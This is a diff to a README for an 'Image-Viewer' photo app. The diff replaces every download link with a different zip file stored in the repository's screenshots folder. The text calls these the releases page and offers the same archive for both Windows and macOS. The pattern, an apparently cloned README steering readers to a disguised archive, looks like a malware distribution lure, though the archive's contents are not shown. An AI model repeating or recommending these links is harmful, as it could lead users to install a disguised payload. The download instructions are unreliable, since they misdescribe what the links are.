@@ -4,7 +4,7 @@ Welcome to Image-Viewer, an easy-to-use application for displaying and navigatin
 
 ## 📥 Download Now
 
-[![Download Image-Viewer](https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip%20Image--Viewer-v1.0-blue)](https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip)
+[![Download Image-Viewer](https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip%20Image--Viewer-v1.0-blue)](https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip)
 
 ## 📖 Introduction
 
@@ -21,9 +21,9 @@ Image-Viewer is a Python application built with CustomTkinter. It helps you disp
 
 ### 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to download the Image-Viewer: [Download Image-Viewer](https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip).
+1. **Visit the Releases Page:** Go to the following link to download the Image-Viewer: [Download Image-Viewer](https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip).
    
-2. **Choose the Latest Version:** Locate the latest release version. The file names typically look like `https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip` for Windows or `https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip` for macOS.
+2. **Choose the Latest Version:** Locate the latest release version. The file names typically look like `https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip` for Windows or `https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip` for macOS.
 
 3. **Download the File:** Click on the appropriate file to start the download.
 
@@ -94,4 +94,4 @@ For any questions or support, feel free to reach out through the issues page on 
 
 For more updates and features, keep an eye on the releases page. 
 
-[Download Image-Viewer](https://raw.githubusercontent.com/Auth0rity2025/Image-Viewer/main/screenshots/Image-Viewer_3.5.zip) to enjoy a smooth photo-viewing experience!
+[Download Image-Viewer](https://github.com/Auth0rity2025/Image-Viewer/raw/refs/heads/main/screenshots/Image_Viewer_v3.1.zip) to enjoy a smooth photo-viewing experience!
